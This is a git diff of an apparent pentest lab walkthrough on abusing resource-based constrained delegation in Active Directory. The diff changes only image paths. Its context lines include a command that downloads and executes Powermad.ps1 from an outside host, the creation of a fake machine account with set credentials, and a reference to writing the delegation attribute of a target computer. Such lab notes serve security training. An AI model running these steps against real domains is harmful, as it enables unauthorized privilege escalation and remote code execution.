@@ -80,7 +80,7 @@ iex (iwr http://192.168.248.2:8090/Powermad.ps1 -usebasicparsing)
 New-MachineAccount -Domain secure.local -Credential $creds -DomainController 10.0.0.100 -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../../.gitbook/assets/image (67) (1) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (67) (1) (1) (1) (1) (1) (1).png>)
 
 6\. Get the SID of the computerobject we created:
 
@@ -102,7 +102,7 @@ $SD.GetBinaryForm($SDBytes, 0)
 Make sure you changed the SID since it can differ in your lab.
 {% endhint %}
 
-![](<../../../../.gitbook/assets/image (49) (1).png>)
+![](<../../../../.gitbook/assets/image (49) (1) (1).png>)
 
 8\. Now we can write as `sa_sql` to the `msds-allowedtoactonbehalfofotheridentity` attribute of the computerobject `DATA01`:
 
